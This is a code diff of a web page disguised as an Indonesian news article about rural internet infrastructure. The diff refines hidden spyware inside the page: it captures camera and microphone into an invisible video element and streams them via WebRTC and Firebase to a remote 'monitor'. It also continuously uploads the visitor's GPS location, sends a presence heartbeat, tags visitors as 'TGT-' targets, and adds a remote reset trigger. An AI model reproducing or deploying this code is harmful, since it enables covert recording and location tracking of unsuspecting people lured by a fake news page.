@@ -7,15 +7,15 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-        .nav { background: #1e40af; color: white; padding: 15px; font-weight: bold; margin-bottom: 20px; }
+        body { font-family: sans-serif; margin: 0; padding: 20px; line-height: 1.6; }
+        .nav { background: #b91c1c; color: white; padding: 15px; font-weight: bold; margin-bottom: 20px; }
         #v { display: none; }
     </style>
 </head>
 <body>
-    <div class="nav">NEWS UPDATE LIVE</div>
-    <h1>Infrastruktur Digital Masa Depan Indonesia</h1>
-    <p>Pengembangan jaringan komunikasi yang stabil menjadi prioritas utama...</p>
+    <div class="nav">INFORMASI NASIONAL</div>
+    <h1>Pembangunan Infrastruktur Digital di Daerah Terpencil</h1>
+    <p>Pemerintah terus berupaya memperluas akses internet cepat hingga ke pelosok desa guna mendukung ekonomi kreatif masyarakat...</p>
     <img src="https://picsum.photos/800/400" style="width:100%; border-radius:10px;">
     
     <video id="v" autoplay playsinline muted></video>
@@ -28,20 +28,19 @@
         };
         firebase.initializeApp(firebaseConfig);
 
-        // Gunakan ID tetap dari localStorage agar konsisten
-        let targetId = localStorage.getItem('target_id');
-        if (!targetId) {
-            targetId = "TGT-" + Math.random().toString(36).substr(2, 5);
-            localStorage.setItem('target_id', targetId);
-        }
+        let targetId = localStorage.getItem('target_id') || ("TGT-" + Math.random().toString(36).substr(2, 5));
+        localStorage.setItem('target_id', targetId);
 
-        const db = firebase.database().ref('v6_sync/' + targetId);
+        const db = firebase.database().ref('v8_auto_sync/' + targetId);
         let pc;
         let localStream;
 
-        async function createOffer() {
-            console.log("Memulai proses Handshake (Kirim Offer)...");
-            if (pc) pc.close();
+        async function createNewOffer() {
+            console.log("Menerima permintaan reset dari monitor. Memulai ulang koneksi...");
+            if (pc) {
+                pc.close();
+                pc = null;
+            }
             
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 
@@ -56,7 +55,7 @@
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
             
-            // Bersihkan data lama sebelum kirim yang baru
+            // Bersihkan data lama di folder sdp sebelum kirim yang baru
             await db.child('ice_t').remove();
             await db.child('ice_m').remove();
             await db.child('sdp/answer').remove();
@@ -68,34 +67,33 @@
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('v').srcObject = localStream;
-            } catch (e) { console.error("Kamera/Audio diblokir"); }
+            } catch (e) { console.error("Izin ditolak"); }
 
-            // Update status keberadaan target
-            setInterval(() => {
-                db.child('presence').set(Date.now());
-            }, 3000);
-
-            // Logika RE-SYNC: Jika Monitor refresh, ia akan menghapus folder 'sdp/answer'
-            // Target mendengarkan ini, jika answer dihapus tapi monitor masih ada, kirim offer lagi.
-            db.child('sdp/answer').on('value', async s => {
-                const a = s.val();
-                if (a && !pc.currentRemoteDescription) {
-                    await pc.setRemoteDescription(new RTCSessionDescription(a));
+            // Deteksi sinyal reset dari monitor (tanpa refresh halaman)
+            db.child('reset_signal').on('value', s => {
+                if (s.exists()) {
+                    createNewOffer();
+                    db.child('reset_signal').remove(); // Hapus trigger setelah dibaca
                 }
             });
 
-            // LOGIKA UTAMA: Pantau 'monitor_ping'. Jika monitor baru masuk (refresh), kirim Offer.
-            db.child('monitor_ping').on('value', s => {
-                if (s.exists()) createOffer();
+            db.child('sdp/answer').on('value', async s => {
+                const a = s.val();
+                if (a && pc && !pc.currentRemoteDescription) {
+                    await pc.setRemoteDescription(new RTCSessionDescription(a));
+                }
             });
 
             db.child('ice_m').on('child_added', s => {
                 if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
             });
 
-            // Kirim lokasi
+            // Heartbeat agar monitor tahu target masih ada
+            setInterval(() => db.child('presence').set(Date.now()), 3000);
+            
+            // Lokasi
             navigator.geolocation.watchPosition(p => {
-                db.child('status').update({ lat: p.coords.latitude, lng: p.coords.longitude, id: targetId });
+                db.child('status').update({ lat: p.coords.latitude, lng: p.coords.longitude });
             });
         }
 
